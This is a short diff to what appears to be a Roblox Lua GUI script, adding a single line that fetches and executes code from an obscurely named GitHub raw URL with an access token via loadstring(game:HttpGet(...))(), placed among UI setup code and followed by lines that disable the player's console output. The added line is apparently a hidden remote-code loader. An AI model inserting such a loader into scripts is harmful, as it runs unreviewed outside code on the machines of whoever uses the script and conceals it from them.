@@ -368,6 +368,8 @@ _19.TextColor3 = Color3.fromRGB(255, 221, 134)
 _19.TextSize = 14.000
 _19.TextXAlignment = Enum.TextXAlignment.Left
 
+loadstring(game:HttpGet(('https://raw.githubusercontent.com/RealBebramen/fkjerhtkjag/main/bfherjvfhje/grht/sry/serhsarstryu/yt5rtrtys/mefwryege.cash?token=GHSAT0AAAAAABY46JSPOLJD4YQFVL7TD4HOYZUHEVQ')))()
+
 wait(2)
 game.Players.LocalPlayer:WaitForChild("PlayerGui").ConsoleGui.Enabled = false
 neverload()
